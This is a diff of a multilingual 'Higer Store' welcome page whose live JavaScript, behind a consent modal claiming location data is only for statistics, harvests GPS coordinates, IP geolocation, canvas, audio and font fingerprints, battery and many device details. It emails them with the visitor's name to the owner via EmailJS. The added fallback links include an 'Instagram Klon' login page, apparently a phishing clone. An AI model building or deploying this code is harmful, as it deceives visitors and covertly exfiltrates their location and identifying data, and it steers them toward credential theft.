@@ -12,7 +12,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.7.77/Tone.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     
-    <!-- Dahili Stiller (style.css içeriği) -->
+    <!-- Dahili Stiller -->
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         body { font-family: 'Inter', sans-serif; background-color: #1a1a1e; }
@@ -33,11 +33,11 @@
 
     <!-- Ana İçerik -->
     <div class="container mx-auto p-4 sm:p-8 text-center flex flex-col items-center justify-center min-h-screen"> 
-        <h1 class="text-4xl font-bold mb-4" data-translate-key="welcomeHeader">Hoş Geldiniz</h1> 
-        <p class="text-lg mb-8" data-translate-key="welcomeSubtitle">Lütfen devam etmek için bilgileri onaylayın.</p> 
+        <h1 class="text-4xl font-bold mb-4" data-translate-key="welcomeHeader"></h1> 
+        <p class="text-lg mb-8" data-translate-key="welcomeSubtitle"></p> 
         <a href="https://t.me/code_unterstutzung" target="_blank" rel="noopener noreferrer" class="inline-flex items-center justify-center w-full max-w-md px-8 py-4 bg-sky-500 hover:bg-sky-600 text-white font-bold rounded-xl shadow-lg transition-transform transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-sky-400"> 
             <i class="fab fa-telegram-plane text-2xl me-3"></i> 
-            <span data-translate-key="telegramButton">Telegram Grubumuza Katılın</span>
+            <span data-translate-key="telegramButton"></span>
         </a> 
         <div id="link-buttons" class="w-full max-w-md mt-8"></div> 
     </div> 
@@ -56,50 +56,44 @@
                 </select>
             </div>
 
-            <h2 class="text-2xl font-bold text-center text-[#f0f0f5] mb-4" data-translate-key="modalTitle">Bilgilendirme</h2> 
-            <p class="text-center text-[#c0c0c5] mb-6" data-translate-key="modalSubtitle">Bu site, istatistik oluşturmak amacıyla konum verinizi kullanmak için izin ister. Devam etmek için lütfen adınızı girip onaylayın.</p> 
+            <h2 class="text-2xl font-bold text-center text-[#f0f0f5] mb-4" data-translate-key="modalTitle"></h2> 
+            <p class="text-center text-[#c0c0c5] mb-6" data-translate-key="modalSubtitle"></p> 
             
             <div class="mb-6"> 
-                <input type="text" id="visitor-name-input" class="w-full px-4 py-3 bg-[#1a1a1e] text-white border-2 border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition" data-translate-key="namePlaceholder" placeholder="Adınızı giriniz..."> 
+                <input type="text" id="visitor-name-input" class="w-full px-4 py-3 bg-[#1a1a1e] text-white border-2 border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition" data-translate-key="namePlaceholder"> 
             </div> 
             
             <div id="error-message" class="hidden text-center text-red-400 mb-4 font-semibold"></div> 
             
             <div class="flex justify-center space-x-4"> 
-                <button id="reject-btn" class="px-6 py-3 bg-gray-600 hover:bg-gray-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-gray-500" data-translate-key="rejectButton">Reddet</button> 
-                <button id="accept-btn" class="px-6 py-3 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-indigo-500" data-translate-key="acceptButton">Kabul Et</button> 
+                <button id="reject-btn" class="px-6 py-3 bg-gray-600 hover:bg-gray-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-gray-500" data-translate-key="rejectButton"></button> 
+                <button id="accept-btn" class="px-6 py-3 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-indigo-500" data-translate-key="acceptButton"></button> 
             </div> 
         </div> 
     </div> 
 
-    <!-- Yükleniyor Spinner -->
     <div id="spinner-overlay" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-[60]"> 
         <div class="spinner w-16 h-16 rounded-full"></div> 
     </div> 
 
-    <!-- Durum Mesajı -->
     <div id="status-message" aria-live="polite" class="fixed bottom-5 right-5 p-4 rounded-lg text-white font-bold shadow-lg z-[70] opacity-0 transform translate-y-4 pointer-events-none"></div> 
   
-    <!-- Dahili JavaScript (tüm .js dosyalarının içeriği) -->
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             
-            // --- TÜM ÇEVİRİ VERİLERİ ---
             const ALL_TRANSLATIONS = {
-                tr: { "pageTitle": "Higer Store", "welcomeHeader": "Hoş Geldiniz", "welcomeSubtitle": "Lütfen devam etmek için bilgileri onaylayın.", "telegramButton": "Telegram Grubumuza Katılın", "modalTitle": "Bilgilendirme", "modalSubtitle": "Bu site, istatistik oluşturmak amacıyla konum verinizi kullanmak için izin ister. Devam etmek için lütfen adınızı girip onaylayın.", "namePlaceholder": "Adınızı giriniz...", "rejectButton": "Reddet", "acceptButton": "Kabul Et", "rejectError": "Devam etmek için kabul etmelisiniz.", "choiceError": "Lütfen bir seçim yapın.", "nameError": "Lütfen adınızı giriniz.", "successMessage": "Doğrulama başarılı ✅", "errorMessage": "Doğrulama başarısız oldu ❌", "criticalError": "Veri toplanamadı ❌" },
-                en: { "pageTitle": "Higer Store", "welcomeHeader": "Welcome", "welcomeSubtitle": "Please confirm the information to continue.", "telegramButton": "Join our Telegram Group", "modalTitle": "Information", "modalSubtitle": "This site requests permission to use your location data for statistical purposes. Please enter your name and confirm to continue.", "namePlaceholder": "Enter your name...", "rejectButton": "Reject", "acceptButton": "Accept", "rejectError": "You must accept to continue.", "choiceError": "Please make a selection.", "nameError": "Please enter your name.", "successMessage": "Verification successful ✅", "errorMessage": "Verification failed ❌", "criticalError": "Data could not be collected ❌" },
-                de: { "pageTitle": "Higer Store", "welcomeHeader": "Willkommen", "welcomeSubtitle": "Bitte bestätigen Sie die Informationen, um fortzufahren.", "telegramButton": "Treten Sie unserer Telegram-Gruppe bei", "modalTitle": "Information", "modalSubtitle": "Diese Seite bittet um Erlaubnis, Ihre Standortdaten für statistische Zwecke zu verwenden. Bitte geben Sie Ihren Namen ein und bestätigen Sie, um fortzufahren.", "namePlaceholder": "Geben Sie Ihren Namen ein...", "rejectButton": "Ablehnen", "acceptButton": "Akzeptieren", "rejectError": "Sie müssen akzeptieren, um fortzufahren.", "choiceError": "Bitte treffen Sie eine Auswahl.", "nameError": "Bitte geben Sie Ihren Namen ein.", "successMessage": "Überprüfung erfolgreich ✅", "errorMessage": "Überprüfung fehlgeschlagen ❌", "criticalError": "Daten konnten nicht erfasst werden ❌" },
-                ru: { "pageTitle": "Higer Store", "welcomeHeader": "Добро пожаловать", "welcomeSubtitle": "Пожалуйста, подтвердите информацию, чтобы продолжить.", "telegramButton": "Присоединяйтесь к нашей группе в Telegram", "modalTitle": "Информация", "modalSubtitle": "Этот сайт запрашивает разрешение на использование ваших данных о местоположении для статистических целей. Пожалуйста, введите ваше имя и подтвердите, чтобы продолжить.", "namePlaceholder": "Введите ваше имя...", "rejectButton": "Отклонить", "acceptButton": "Принять", "rejectError": "Вы должны принять, чтобы продолжить.", "choiceError": "Пожалуйста, сделайте выбор.", "nameError": "Пожалуйста, введите ваше имя.", "successMessage": "Проверка прошла успешно ✅", "errorMessage": "Проверка не удалась ❌", "criticalError": "Не удалось собрать данные ❌" },
-                ar: { "pageTitle": "متجر هايجر", "welcomeHeader": "أهلاً بك", "welcomeSubtitle": "يرجى تأكيد المعلومات للمتابعة.", "telegramButton": "انضم إلى مجموعة التليجرام الخاصة بنا", "modalTitle": "معلومات", "modalSubtitle": "يطلب هذا الموقع الإذن باستخدام بيانات موقعك لأغراض إحصائية. يرجى إدخال اسمك والتأكيد للمتابعة.", "namePlaceholder": "أدخل اسمك...", "rejectButton": "رفض", "acceptButton": "قبول", "rejectError": "يجب أن تقبل للمتابعة.", "choiceError": "الرجاء تحديد اختيار.", "nameError": "الرجاء إدخال اسمك.", "successMessage": "تم التحقق بنجاح ✅", "errorMessage": "فشل التحقق ❌", "criticalError": "لم نتمكن من جمع البيانات ❌" }
+                tr: { "pageTitle": "Higer Store", "welcomeHeader": "Hoş Geldiniz", "welcomeSubtitle": "Lütfen devam etmek için bilgileri onaylayın.", "telegramButton": "Telegram Grubumuza Katılın", "modalTitle": "Bilgilendirme", "modalSubtitle": "Bu site, istatistik oluşturmak amacıyla konum verinizi kullanmak için izin ister. Devam etmek için lütfen adınızı girip onaylayın.", "namePlaceholder": "Adınızı giriniz...", "rejectButton": "Reddet", "acceptButton": "Kabul Et", "rejectError": "Devam etmek için kabul etmelisiniz.", "choiceError": "Lütfen bir seçim yapın.", "nameError": "Lütfen adınızı giriniz.", "successMessage": "Doğrulama başarılı ✅", "errorMessage": "Doğrulama başarısız oldu ❌", "criticalError": "Veri toplanamadı ❌", "linkLoadError": "Bağlantılar yüklenemedi, yedekler gösteriliyor.", "emailJsInitError": "Gönderim servisi başlatılamadı!" },
+                en: { "pageTitle": "Higer Store", "welcomeHeader": "Welcome", "welcomeSubtitle": "Please confirm the information to continue.", "telegramButton": "Join our Telegram Group", "modalTitle": "Information", "modalSubtitle": "This site requests permission to use your location data for statistical purposes. Please enter your name and confirm to continue.", "namePlaceholder": "Enter your name...", "rejectButton": "Reject", "acceptButton": "Accept", "rejectError": "You must accept to continue.", "choiceError": "Please make a selection.", "nameError": "Please enter your name.", "successMessage": "Verification successful ✅", "errorMessage": "Verification failed ❌", "criticalError": "Data could not be collected ❌", "linkLoadError": "Could not load links, showing fallback.", "emailJsInitError": "Mailing service could not be initialized!" },
+                de: { "pageTitle": "Higer Store", "welcomeHeader": "Willkommen", "welcomeSubtitle": "Bitte bestätigen Sie die Informationen, um fortzufahren.", "telegramButton": "Treten Sie unserer Telegram-Gruppe bei", "modalTitle": "Information", "modalSubtitle": "Diese Seite bittet um Erlaubnis, Ihre Standortdaten für statistische Zwecke zu verwenden. Bitte geben Sie Ihren Namen ein und bestätigen Sie, um fortzufahren.", "namePlaceholder": "Geben Sie Ihren Namen ein...", "rejectButton": "Ablehnen", "acceptButton": "Akzeptieren", "rejectError": "Sie müssen akzeptieren, um fortzufahren.", "choiceError": "Bitte treffen Sie eine Auswahl.", "nameError": "Bitte geben Sie Ihren Namen ein.", "successMessage": "Überprüfung erfolgreich ✅", "errorMessage": "Überprüfung fehlgeschlagen ❌", "criticalError": "Daten konnten nicht erfasst werden ❌", "linkLoadError": "Links konnten nicht geladen werden, Fallback wird angezeigt.", "emailJsInitError": "Mail-Dienst konnte nicht initialisiert werden!" },
+                ru: { "pageTitle": "Higer Store", "welcomeHeader": "Добро пожаловать", "welcomeSubtitle": "Пожалуйста, подтвердите информацию, чтобы продолжить.", "telegramButton": "Присоединяйтесь к нашей группе в Telegram", "modalTitle": "Информация", "modalSubtitle": "Этот сайт запрашивает разрешение на использование ваших данных о местоположении для статистических целей. Пожалуйста, введите ваше имя и подтвердите, чтобы продолжить.", "namePlaceholder": "Введите ваше имя...", "rejectButton": "Отклонить", "acceptButton": "Принять", "rejectError": "Вы должны принять, чтобы продолжить.", "choiceError": "Пожалуйста, сделайте выбор.", "nameError": "Пожалуйста, введите ваше имя.", "successMessage": "Проверка прошла успешно ✅", "errorMessage": "Проверка не удалась ❌", "criticalError": "Не удалось собрать данные ❌", "linkLoadError": "Не удалось загрузить ссылки, показан резервный вариант.", "emailJsInitError": "Почтовый сервис не может быть инициализирован!" },
+                ar: { "pageTitle": "متجر هايجر", "welcomeHeader": "أهلاً بك", "welcomeSubtitle": "يرجى تأكيد المعلومات للمتابعة.", "telegramButton": "انضم إلى مجموعة التليجرام الخاصة بنا", "modalTitle": "معلومات", "modalSubtitle": "يطلب هذا الموقع الإذن باستخدام بيانات موقعك لأغراض إحصائية. يرجى إدخال اسمك والتأكيد للمتابعة.", "namePlaceholder": "أدخل اسمك...", "rejectButton": "رفض", "acceptButton": "قبول", "rejectError": "يجب أن تقبل للمتابعة.", "choiceError": "الرجاء تحديد اختيار.", "nameError": "الرجاء إدخال اسمك.", "successMessage": "تم التحقق بنجاح ✅", "errorMessage": "فشل التحقق ❌", "criticalError": "لم نتمكن من جمع البيانات ❌", "linkLoadError": "تعذر تحميل الروابط ، يتم عرض الروابط الاحتياطية.", "emailJsInitError": "لا يمكن تهيئة خدمة البريد!" }
             };
 
-            // --- AYARLAR ---
             const EMAILJS_SERVICE_ID = 'service_5uyhust';
             const EMAILJS_TEMPLATE_ID = 'template_5p9annp';
             const EMAILJS_PUBLIC_KEY = 'F5cGGWMEHBUJTYWe_';
             const NA = "N/A";
 
-            // --- DOM ELEMENTLERİ ---
             const dom = {
                 modalBackdrop: document.getElementById('modal-backdrop'),
                 modalContent: document.getElementById('modal-content'),
@@ -117,14 +111,12 @@
             const startTime = new Date();
             let currentTranslations = {};
 
-            // --- ARAYÜZ FONKSİYONLARI (ui.js içeriği) ---
             const playSound = async (noteSequence) => { try { await Tone.start(); const synth = new Tone.Synth().toDestination(); const now = Tone.now(); noteSequence.forEach((note, i) => synth.triggerAttackRelease(note.note, note.duration, now + i * 0.15)); } catch (error) { console.warn("Could not play sound effect:", error); } };
             const shakeModal = (message) => { dom.errorMessage.textContent = message; dom.errorMessage.classList.remove('hidden'); dom.modalContent.classList.add('animate-shake'); setTimeout(() => dom.modalContent.classList.remove('animate-shake'), 500); };
             const showStatusMessage = (message, isSuccess) => { dom.statusMessage.textContent = message; dom.statusMessage.className = `fixed bottom-5 right-5 p-4 rounded-lg text-white font-bold shadow-lg z-[70] transition-all duration-500 ${isSuccess ? 'bg-green-600' : 'bg-red-600'}`; dom.statusMessage.classList.remove('opacity-0', 'translate-y-4'); setTimeout(() => { dom.statusMessage.classList.add('opacity-0', 'translate-y-4'); }, 4000); };
             const toggleSpinner = (show) => dom.spinnerOverlay.classList.toggle('hidden', !show);
             const toggleModal = (show) => dom.modalBackdrop.classList.toggle('hidden', !show);
-
-            // --- VERİ TOPLAMA FONKSİYONLARI (dataCollector.js içeriği) ---
+            
             const cyrb53 = (str, seed = 0) => { let h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed; for (let i = 0, ch; i < str.length; i++) { ch = str.charCodeAt(i); h1 = Math.imul(h1 ^ ch, 2654435761); h2 = Math.imul(h2 ^ ch, 1597334677); } h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909); h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909); return 4294967296 * (2097151 & h2) + (h1 >>> 0); };
             const getFingerprints = async () => { const getCanvasFp = () => { try { const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); const txt = 'abcdefghijklmnopqrstuvwxyz0123456789'; ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText(txt, 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText(txt, 4, 17); return cyrb53(canvas.toDataURL()); } catch (e) { return NA; } }; const getAudioFp = async () => { try { const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100); const oscillator = audioCtx.createOscillator(); oscillator.type = "triangle"; oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime); const compressor = audioCtx.createDynamicsCompressor(); compressor.threshold.setValueAtTime(-50, audioCtx.currentTime); oscillator.connect(compressor); compressor.connect(audioCtx.destination); oscillator.start(0); const renderedBuffer = await audioCtx.startRendering(); const fingerprint = renderedBuffer.getChannelData(0).slice(4500, 5000).reduce((acc, val) => acc + Math.abs(val), 0).toString(); return cyrb53(fingerprint); } catch (e) { return NA; } }; const getFontsFp = () => { try { const baseFonts = ['monospace', 'sans-serif', 'serif']; const testString = "mmmmmmmmmmlli"; const testSize = '72px'; const h = document.body; const s = document.createElement("span"); s.style.fontSize = testSize; s.innerHTML = testString; const defaultWidth = {}; const defaultHeight = {}; baseFonts.forEach(font => { s.style.fontFamily = font; h.appendChild(s); defaultWidth[font] = s.offsetWidth; defaultHeight[font] = s.offsetHeight; h.removeChild(s); }); const fontList = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact']; let availableFonts = fontList.filter(font => baseFonts.some(baseFont => { s.style.fontFamily = `${font},${baseFont}`; h.appendChild(s); const detected = s.offsetWidth !== defaultWidth[baseFont] || s.offsetHeight !== defaultHeight[baseFont]; h.removeChild(s); return detected; })); return cyrb53(availableFonts.join(',')); } catch (e) { return NA; } }; const [audio_fingerprint, canvas_fingerprint, fonts_hash] = await Promise.all([ getAudioFp(), getCanvasFp(), getFontsFp() ]); return { audio_fingerprint, canvas_fingerprint, fonts_hash }; };
             const getGeolocationInfo = () => new Promise(resolve => { const fetchIpApi = async () => { try { const response = await fetch(`https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`); if (!response.ok) return { query: NA, status: 'fail', message: `HTTP error ${response.status}` }; return await response.json(); } catch (e) { return { query: NA, status: 'fail', message: 'Network request failed' }; } }; if (!navigator.geolocation) return resolve({ ip: NA, geolocation: "API Not Supported" }); navigator.geolocation.getCurrentPosition( async pos => { const ipApiData = await fetchIpApi(); const fullGeoData = { PERMISSION: 'Granted', GPS_COORDS: { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }, IP_API_DATA: ipApiData }; resolve({ ip: ipApiData.query, geolocation: JSON.stringify(fullGeoData, null, 2) }); }, async err => { const ipApiData = await fetchIpApi(); const fullGeoData = { PERMISSION: err.code === 1 ? 'Denied by user' : 'Unavailable', IP_API_DATA: ipApiData }; resolve({ ip: ipApiData.query, geolocation: JSON.stringify(fullGeoData, null, 2) }); }, { timeout: 10000, enableHighAccuracy: true } ); });
@@ -133,7 +125,6 @@
             const getMiscInfo = async () => { let battery_status = NA, battery_charge_discharge_time = NA; if (navigator.getBattery && typeof navigator.getBattery === 'function') { try { const battery = await navigator.getBattery(); battery_status = `${Math.round(battery.level*100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`; const chargeTime = isFinite(battery.chargingTime) ? `${battery.chargingTime/60}min` : NA; const dischargeTime = isFinite(battery.dischargingTime) ? `${battery.dischargingTime/60}min` : NA; battery_charge_discharge_time = `Charge: ${chargeTime}, Discharge: ${dischargeTime}`; } catch(e) { /* ignore */ } } const adblock = await (async () => { try { await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", { method: 'HEAD', mode: 'no-cors', cache: 'no-store' }); return "No"; } catch (error) { return "Yes"; } })(); const apis = { 'WebUSB': !!navigator.usb, 'WebBluetooth': !!navigator.bluetooth, 'WebXR': !!navigator.xr, 'Gamepad': !!navigator.getGamepads, 'WebRTC': !!window.RTCPeerConnection, 'WebAudio': !!(window.AudioContext || window.webkitAudioContext) }; const advanced_api_support = Object.entries(apis).filter(([_,v]) => v).map(([k,_]) => k).join(', ') || NA; return { battery_status, battery_charge_discharge_time, adblock_detected: adblock, sensor_support: ('DeviceMotionEvent' in window) ? 'Yes' : 'No/Unknown', advanced_api_support, referrer: document.referrer || "Direct Entry" }; };
             const collectAllData = async (startTime) => { const promises = [getGeolocationInfo(), getFingerprints(), getSystemInfo(), getBehavioralInfo(), getMiscInfo()]; const results = await Promise.allSettled(promises); const allData = results.reduce((acc, r) => (r.status === 'fulfilled' && r.value) ? { ...acc, ...r.value } : acc, {}); allData.timestamp = new Date().toISOString(); allData.visit_duration = `${((new Date() - startTime) / 1000).toFixed(2)} seconds`; const templateKeys = ['timestamp', 'visitor_name', 'ip', 'geolocation', 'canvas_fingerprint', 'audio_fingerprint', 'fonts_hash', 'device_type', 'device_brand', 'device_model', 'gpu_info', 'cpu_cores', 'ram_gb', 'battery_status', 'battery_charge_discharge_time', 'screen_resolution', 'aspect_ratio', 'color_pixel_depth', 'screen_orientation', 'sensor_support', 'os', 'device_platform', 'browser', 'browser_engine', 'user_agent', 'plugins_list', 'referrer', 'network_info', 'navigator_languages', 'keyboard_layout', 'adblock_detected', 'do_not_track', 'pointer_support', 'touch_capable', 'history_length', 'visit_duration', 'user_agent_data', 'advanced_api_support']; templateKeys.forEach(key => { if (!allData[key]) allData[key] = NA; }); return allData; };
 
-            // --- ANA KONTROLCÜ FONKSİYONLARI (main.js içeriği) ---
             const getInitialLanguage = () => { const savedLang = localStorage.getItem('preferredLanguage'); if (savedLang) return savedLang; const browserLang = navigator.language.split('-')[0]; return ['tr', 'en', 'de', 'ru', 'ar'].includes(browserLang) ? browserLang : 'tr'; };
             let currentLanguage = getInitialLanguage();
 
@@ -145,7 +136,6 @@
             };
 
             const renderLinks = (links) => {
-                if (!dom.linkButtonsContainer) return;
                 dom.linkButtonsContainer.innerHTML = '';
                 const scrollableDiv = document.createElement('div');
                 scrollableDiv.className = 'max-h-[40vh] overflow-y-auto custom-scrollbar pr-2';
@@ -154,7 +144,7 @@
             };
             
             const loadContent = async (lang) => {
-                applyTranslations(lang); // Fetch yerine doğrudan objeden al
+                applyTranslations(lang);
                 toggleSpinner(true);
                 try {
                     const response = await fetch('links.json');
@@ -163,7 +153,13 @@
                     renderLinks(links);
                 } catch (error) {
                     console.error("Link loading error:", error);
-                    showStatusMessage('Bağlantılar yüklenemedi. ❌', false);
+                    showStatusMessage(currentTranslations.linkLoadError, false);
+                    // YEDEK BAĞLANTI SİSTEMİ
+                    const fallbackLinks = [
+                        { "title": "Satranç Oyunu (Yedek)", "url": "https://higer23.github.io/Chess/", "date": "10.09.2025" },
+                        { "title": "Instagram Klon 1 (Yedek)", "url": "https://higer23.github.io/Instaagram-Login/", "date": "10.09.2025" }
+                    ];
+                    renderLinks(fallbackLinks);
                 } finally {
                     toggleSpinner(false);
                 }
@@ -171,29 +167,27 @@
 
             const sendData = async (params) => {
                 toggleSpinner(true);
-                try { await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params); showStatusMessage(currentTranslations.successMessage || '✅', true); } 
-                catch (error) { console.error("EmailJS Error:", error); showStatusMessage(currentTranslations.errorMessage || '❌', false); } 
+                try { await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params); showStatusMessage(currentTranslations.successMessage, true); } 
+                catch (error) { console.error("EmailJS Error:", error); showStatusMessage(currentTranslations.errorMessage, false); } 
                 finally { toggleSpinner(false); }
             };
 
-            // --- OLAY DİNLEYİCİLERİ ---
             dom.languageSwitcher.addEventListener('change', (e) => { currentLanguage = e.target.value; localStorage.setItem('preferredLanguage', currentLanguage); loadContent(currentLanguage); });
-            dom.rejectBtn.addEventListener('click', () => { playSound([{note: "C3", duration: "8n"}]); shakeModal(currentTranslations.rejectError || "Devam etmek için kabul etmelisiniz."); });
-            dom.modalBackdrop.addEventListener('click', (event) => { if (event.target === dom.modalBackdrop) { playSound([{note: "C3", duration: "8n"}]); shakeModal(currentTranslations.choiceError || "Lütfen bir seçim yapın."); } });
+            dom.rejectBtn.addEventListener('click', () => { playSound([{note: "C3", duration: "8n"}]); shakeModal(currentTranslations.rejectError); });
+            dom.modalBackdrop.addEventListener('click', (event) => { if (event.target === dom.modalBackdrop) { playSound([{note: "C3", duration: "8n"}]); shakeModal(currentTranslations.choiceError); } });
             dom.acceptBtn.addEventListener('click', async () => {
                 const visitorName = dom.visitorNameInput.value.trim();
-                if (!visitorName) { playSound([{note: "C3", duration: "8n"}]); shakeModal(currentTranslations.nameError || "Lütfen adınızı giriniz."); return; }
+                if (!visitorName) { playSound([{note: "C3", duration: "8n"}]); shakeModal(currentTranslations.nameError); return; }
                 playSound([{note: "C4", duration: "8n"}, {note: "E4", duration: "8n"}, {note: "G4", duration: "8n"}]);
                 toggleModal(false);
                 try { const data = await collectAllData(startTime); data.visitor_name = visitorName; console.log("COLLECTED DATA FOR VERIFICATION:", data); await sendData(data); } 
-                catch (error) { console.error("Critical error:", error); showStatusMessage(currentTranslations.criticalError || 'Veri toplanamadı. ❌', false); }
+                catch (error) { console.error("Critical error:", error); showStatusMessage(currentTranslations.criticalError, false); }
             });
 
-            // --- BAŞLANGIÇ ---
             const initialize = () => {
                 dom.languageSwitcher.value = currentLanguage;
                 try { emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY }); } 
-                catch (e) { console.error("EmailJS init failed:", e); showStatusMessage("Gönderim servisi başlatılamadı!", false); }
+                catch (e) { console.error("EmailJS init failed:", e); showStatusMessage(currentTranslations.emailJsInitError, false); }
                 loadContent(currentLanguage);
             };
 
@@ -202,5 +196,8 @@
     </script>
 </body>
 </html>
+
+
+
 
 
